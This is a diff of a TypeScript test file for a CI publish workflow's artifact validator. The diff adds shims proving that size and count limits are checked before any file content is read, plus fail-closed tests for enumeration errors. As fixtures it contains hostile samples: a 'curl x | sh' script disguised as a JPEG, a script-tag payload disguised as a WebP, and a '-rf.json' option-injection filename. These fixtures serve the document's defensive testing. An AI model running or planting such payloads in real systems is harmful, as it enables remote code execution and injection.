@@ -11,7 +11,7 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { spawnSync, execFileSync } from 'node:child_process';
-import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync, linkSync } from 'node:fs';
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync, linkSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import yaml from 'js-yaml';
@@ -37,16 +37,31 @@ const valid: Fixture = (src) => {
   writeFileSync(join(src, 'editorial', 'img-night-trails-600.webp'), WEBP);
 };
 
-/** Runs the workflow's validation step on an artifact built by `build`. */
-function runValidation(build: Fixture) {
+const real = (cmd: string) => execFileSync('bash', ['-c', `command -v ${cmd}`], { encoding: 'utf8' }).trim();
+const REAL = { head: real('head'), node: real('node') };
+
+/**
+ * Runs the workflow's validation step on an artifact built by `build`. `head` and `node`, the
+ * only commands that read file content, are wrapped by logging shims placed first on PATH, so
+ * a test can prove that no content was read. `find` can be replaced to simulate enumeration
+ * failures.
+ */
+function runValidation(build: Fixture, opts: { find?: string } = {}) {
   const temp = mkdtempSync(join(tmpdir(), 'scout-publish-test-'));
   const src = join(temp, 'scout-artifact');
   const out = join(temp, 'scout-publish');
+  const shims = join(temp, 'shims');
+  const log = join(temp, 'content-reads.log');
   mkdirSync(src);
+  mkdirSync(shims);
+  writeFileSync(log, '');
+  for (const [cmd, path] of Object.entries(REAL)) writeFileSync(join(shims, cmd), `#!/bin/bash\necho "${cmd} $*" >> "$SHIM_LOG"\nexec ${path} "$@"\n`, { mode: 0o755 });
+  if (opts.find) writeFileSync(join(shims, 'find'), `#!/bin/bash\n${opts.find}\n`, { mode: 0o755 });
   build(src);
-  const r = spawnSync('bash', ['-c', validate.run!], { cwd: temp, encoding: 'utf8', env: { PATH: process.env.PATH, SRC: src, OUT: out } });
+  const r = spawnSync('bash', ['-c', validate.run!], { cwd: temp, encoding: 'utf8', env: { PATH: `${shims}:${process.env.PATH}`, SRC: src, OUT: out, SHIM_LOG: log } });
   const staged = existsSync(out) ? execFileSync('find', ['.', '-mindepth', '1'], { cwd: out, encoding: 'utf8' }).trim().split('\n').filter(Boolean).sort() : null;
-  return { temp, out, status: r.status, output: `${r.stdout}${r.stderr}`, staged };
+  const contentReads = readFileSync(log, 'utf8').trim().split('\n').filter(Boolean);
+  return { temp, out, status: r.status, output: `${r.stdout}${r.stderr}`, staged, contentReads };
 }
 
 test('the publish job downloads outside the workspace and publishes only the staged directory', () => {
@@ -73,6 +88,8 @@ test('a valid artifact is staged as plain 0644 files in a new directory without 
   try {
     assert.equal(r.status, 0, r.output);
     assert.match(r.output, /Staged 5 files \(\d+ bytes\) in a clean publishing directory/);
+    // Positive control for the content-read shims used below: a valid artifact is read.
+    assert.ok(r.contentReads.some((l) => l.startsWith('head ')) && r.contentReads.some((l) => l.startsWith('node ')), JSON.stringify(r.contentReads));
     assert.deepEqual(r.staged, ['./candidates.json', './editorial', './editorial/img-night-trails-600.webp', './harbor-sunrise.jpg', './pulse.json', './results.json']);
     for (const f of r.staged!.filter((p) => p.includes('.'))) {
       const st = statSync(join(r.out, f));
@@ -102,13 +119,13 @@ test('malicious artifacts are rejected (fail closed) and nothing is staged', () 
     ['leading dash (option injection)', (s) => writeFileSync(join(s, '-rf.json'), '{}'), /unexpected file name: \.\/-rf\.json/],
     ['parent-directory lookalike', (s) => writeFileSync(join(s, '..json'), '{}'), /unexpected file name: \.\/\.\.json/],
     ['executable content', (s) => writeFileSync(join(s, 'run.sh'), '#!/bin/sh\n', { mode: 0o755 }), /unexpected file name: \.\/run\.sh/],
-    ['script disguised as a JPEG', (s) => writeFileSync(join(s, 'evil.jpg'), '#!/bin/sh\ncurl x | sh\n'), /not a JPEG: \.\/evil\.jpg/],
-    ['HTML disguised as a WebP', (s) => writeFileSync(join(s, 'editorial', 'x-600.webp'), '<script>alert(1)</script>'), /not a WebP: \.\/editorial\/x-600\.webp/],
+    ['script disguised as a JPEG', (s) => writeFileSync(join(s, 'evil.jpg'), '#!/bin/sh\ncurl x | sh\n'), /not a JPEG signature: \.\/evil\.jpg/],
+    ['HTML disguised as a WebP', (s) => writeFileSync(join(s, 'editorial', 'x-600.webp'), '<script>alert(1)</script>'), /not a WebP signature: \.\/editorial\/x-600\.webp/],
     ['invalid JSON', (s) => writeFileSync(join(s, 'pulse.json'), '{not json'), /invalid JSON: \.\/pulse\.json/],
     ['hard link is copied, not linked', (s) => linkSync(join(s, 'results.json'), join(s, 'second.json')), /^$/],
     ['missing results.json', (s) => rmSync(join(s, 'results.json')), /results\.json is missing/],
-    ['too many files', (s) => { for (let i = 0; i < 500; i++) writeFileSync(join(s, `f${i}.json`), '{}'); }, /too many files \(50[0-9]\)/],
-    ['too large', (s) => { writeFileSync(join(s, 'big.webp'), WEBP); execFileSync('truncate', ['-s', '53000000', join(s, 'big.webp')]); }, /results too large \(\d+ bytes\)/],
+    ['too many files', (s) => { for (let i = 0; i < 500; i++) writeFileSync(join(s, `f${i}.json`), '{}'); }, /too many files \(more than 500\)/],
+    ['too large', (s) => { writeFileSync(join(s, 'big.webp'), WEBP); execFileSync('truncate', ['-s', '53000000', join(s, 'big.webp')]); }, /results too large \(more than 52428800 bytes\)/],
   ];
   for (const [name, mutate, expected] of cases) {
     const r = runValidation((src) => {
@@ -126,6 +143,44 @@ test('malicious artifacts are rejected (fail closed) and nothing is staged', () 
       // Paths are printed shell-quoted (${p@Q}); compare without the quotes.
       assert.match(r.output.replace(/'/g, ''), expected, `${name}: ${r.output}`);
       assert.equal(r.staged, null, `${name}: nothing may be staged`);
+    } finally {
+      rmSync(r.temp, { recursive: true, force: true });
+    }
+  }
+});
+
+test('limits are enforced from metadata before any file content is read', () => {
+  const cases: [string, Fixture, RegExp][] = [
+    ['oversized JSON (invalid content, so parsing would also fail)', (s) => { writeFileSync(join(s, 'pulse.json'), '{'); execFileSync('truncate', ['-s', '11000000', join(s, 'pulse.json')]); }, /JSON file too large \(11000000 bytes\): \.\/pulse\.json/],
+    ['cumulative size over 50 MB', (s) => { for (let i = 0; i < 6; i++) { writeFileSync(join(s, `big${i}.webp`), WEBP); execFileSync('truncate', ['-s', '9000000', join(s, `big${i}.webp`)]); } }, /results too large \(more than 52428800 bytes\)/],
+    ['more than 500 files', (s) => { for (let i = 0; i < 500; i++) writeFileSync(join(s, `f${i}.json`), '{bad'); }, /too many files \(more than 500\)/],
+  ];
+  for (const [name, mutate, expected] of cases) {
+    const r = runValidation((src) => { valid(src); mutate(src); });
+    try {
+      assert.notEqual(r.status, 0, `${name}: must fail\n${r.output}`);
+      assert.match(r.output.replace(/'/g, ''), expected, `${name}: ${r.output}`);
+      assert.deepEqual(r.contentReads, [], `${name}: no content may be read before the limits pass`);
+      assert.equal(r.staged, null, `${name}: nothing staged`);
+    } finally {
+      rmSync(r.temp, { recursive: true, force: true });
+    }
+  }
+});
+
+test('enumeration failures fail closed, even after partial output', () => {
+  const cases: [string, string][] = [
+    ['find reports an error after listing some entries', `printf 'f\\t13\\t./results.json\\0'; echo "find: './editorial': Permission denied" >&2; exit 1`],
+    ['find is killed mid-listing', `printf 'f\\t13\\t./results.json\\0d\\t4096\\t./editorial\\0'; kill -9 $$`],
+    ['find fails with no output', 'exit 2'],
+  ];
+  for (const [name, findScript] of cases) {
+    const r = runValidation(valid, { find: findScript });
+    try {
+      assert.notEqual(r.status, 0, `${name}: must fail\n${r.output}`);
+      assert.match(r.output, /::error::could not enumerate the artifact/, `${name}: ${r.output}`);
+      assert.deepEqual(r.contentReads, [], `${name}: nothing read`);
+      assert.equal(r.staged, null, `${name}: nothing staged`);
     } finally {
       rmSync(r.temp, { recursive: true, force: true });
     }
